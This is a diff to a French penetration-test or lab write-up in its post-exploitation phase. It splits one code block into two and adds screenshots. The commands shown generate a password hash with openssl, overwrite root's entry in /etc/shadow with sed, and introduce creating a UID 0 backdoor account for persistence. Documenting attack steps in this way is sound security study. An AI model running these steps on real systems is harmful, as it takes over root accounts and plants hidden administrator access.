@@ -128,12 +128,19 @@ whoami  # root
 
 ### Phase 6 — Post-exploitation
 
-Modification du mot de passe root en générant un nouveau hash et en l'écrivant directement dans `/etc/shadow` :
+Modification du mot de passe root en générant un nouveau hash:
 
 ```bash
 openssl passwd -1 hacked
+```
+![payload generation](screenshots/hashgeneration.png)
+ 
+Ecrivant le hash directement dans `/etc/shadow` :
+
+```bash
 sed -i 's|^root:[^:]*:|root:<nouveau_hash>:|' /etc/shadow
 ```
+![payload generation](screenshots/remplacement_hash.png)
 
 Création d'un compte backdoor avec UID 0 (identique à root) pour conserver l'accès même si le mot de passe root est modifié ultérieurement :
 
